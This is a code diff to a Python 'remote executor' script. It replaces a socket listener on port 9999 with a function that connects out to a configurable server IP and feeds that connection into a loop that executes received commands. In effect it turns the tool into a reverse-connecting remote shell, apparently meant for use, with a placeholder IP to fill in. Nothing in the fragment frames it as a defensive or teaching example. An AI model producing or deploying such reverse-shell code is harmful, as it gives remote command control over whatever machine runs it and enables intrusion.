@@ -40,14 +40,7 @@ def execute_command(cmd):
     except Exception as e:
         return f"Execution error: {e}"
 
-def start_listener():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(("0.0.0.0", 9999))
-    server.listen(1)
-    print("Remote executor listening on port 9999...")
-    conn, addr = server.accept()
-    print(f"Connected by {addr}")
-
+def handle_connection(conn):
     while True:
         try:
             header = conn.recv(1024).decode()
@@ -96,4 +89,14 @@ def start_listener():
 
     conn.close()
 
-start_listener()
+def connect_to_server():
+    try:
+        server_ip = "192.168.1.100"  # Replace with your server's IP
+        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        conn.connect((server_ip, 9999))
+        print(f"Connected to server at {server_ip}")
+        handle_connection(conn)
+    except Exception as e:
+        print(f"Connection error: {e}")
+
+connect_to_server()
